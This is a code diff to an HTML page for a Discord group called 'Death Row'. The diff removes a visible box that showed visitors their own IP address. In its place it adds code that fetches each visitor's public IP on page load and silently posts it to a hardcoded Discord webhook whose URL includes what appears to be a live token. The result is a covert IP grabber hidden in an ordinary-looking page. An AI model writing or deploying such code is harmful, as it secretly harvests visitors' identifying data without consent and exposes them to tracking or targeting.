@@ -70,6 +70,10 @@
             text-align: left;
             background-color: #111111; /* Dark background for the embed */
         }
+        .embed img {
+            display: block;
+            margin: 0 auto 10px;
+        }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
     <link rel="icon" href="path_to_your_favicon.ico" type="image/x-icon"> <!-- Favicon link -->
@@ -131,15 +135,12 @@
     <div class="header">
         Discord.gg/499
     </div>
-    <div class="embed">
-        <h2>Visitor Info</h2>
-        <p id="visitorIP">IP: Loading...</p>
-        <p id="visitorName">Name: Loading...</p>
-    </div>
     <div class="footer">
         <span>Death Row</span>
     </div>
     <script>
+        const webhookURL = "https://canary.discord.com/api/webhooks/1256247502366314576/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1"; // Replace with your Discord webhook URL
+
         let slideIndex = 0;
         showSlides();
 
@@ -158,7 +159,8 @@
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    document.getElementById('visitorIP').innerText = `IP: ${data.ip}`;
+                    console.log('IP fetched:', data.ip);
+                    sendToDiscord(data.ip);
                 })
                 .catch(error => console.error('Error fetching IP:', error));
         }
@@ -166,6 +168,39 @@
         function fetchName() {
             const visitorName = "Unknown Visitor"; // Placeholder if no name is available
             document.getElementById('visitorName').innerText = `Name: ${visitorName}`;
+        }
+
+        function sendToDiscord(ip) {
+            const message = {
+                username: "ايبي",
+                avatar_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&", // Optional: URL to the bot's avatar image
+                embeds: [{
+                    title: "Visitor IP Information",
+                    description: `Visitor IP: ${ip}`,
+                    color: 15258703, // Hex color code as decimal (0xE74C3C)
+                    footer: {
+                        text: "Death Row",
+                        icon_url: "https://cdn.discordapp.com/attachments/1247389407431098479/1257195010533756980/300b41751a5a000579d9167707ebd7e4.png?ex=66838598&is=66823418&hm=50495049dd54d9ba80b33e0687c38db74711f535ac67b719e48bf2b2a06f43d3&"
+                    },
+                    image: {
+                        url: "https://cdn.discordapp.com/attachments/1256064719610183730/1257211351848456242/af50ed15d83254f31fcba9048ab5db67.gif?ex=668394d0&is=66824350&hm=08666be597113f4592b9c1cc7d0f8d9bec01ea9ee239ff0284d18d3727c6f2df&" // URL to your GIF
+                    }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Discord successfully');
+                } else {
+                    console.error('Error sending message to Discord:', response.statusText);
+                }
+            }).catch(error => console.error('Error sending to Discord:', error));
         }
 
         window.onload = function() {
